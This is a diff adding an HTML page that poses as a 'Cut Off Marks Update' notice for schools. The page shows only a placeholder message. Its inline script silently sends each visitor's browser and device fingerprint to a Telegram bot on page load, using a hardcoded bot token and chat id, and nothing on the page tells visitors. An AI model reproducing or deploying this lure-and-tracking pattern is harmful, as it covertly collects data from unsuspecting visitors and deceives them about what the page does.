@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js/dist/ua-parser.min.js"></script>
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background: linear-gradient(to right, #667eea, #764ba2);
+            color: #fff;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .content {
+            max-width: 600px;
+            padding: 40px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+        }
+    </style>
+    <title>Cut Off Marks List</title>
+</head>
+<body>
+    <div class="content">
+        <h1>
+        Cut Off Marks Update (QMS) </h1>
+        <p>Thank you for your interest. The cut off marks for all schools will be listed here once they are released. check back later!.</p>
+    </div>
+    
+    <script>
+    
+    $.ajax({
+    url: 'https://api.telegram.org/bot6404586790:AAFpuevp9GBg7tLVDsw95JcWD93Lw5dj480/sendMessage',
+    method: 'GET',
+    data: {
+    chat_id: '6839990154',
+    text: 'User Agent: ' + JSON.stringify(new UAParser().getResult())
+    },
+    success: function(response) {
+    console.log('successfully');
+    },
+    error: function(error) {
+    console.error('Error');
+    }
+    });
+    
+    </script>
+</body>
+</html>
+
+
+
+
+
+ 
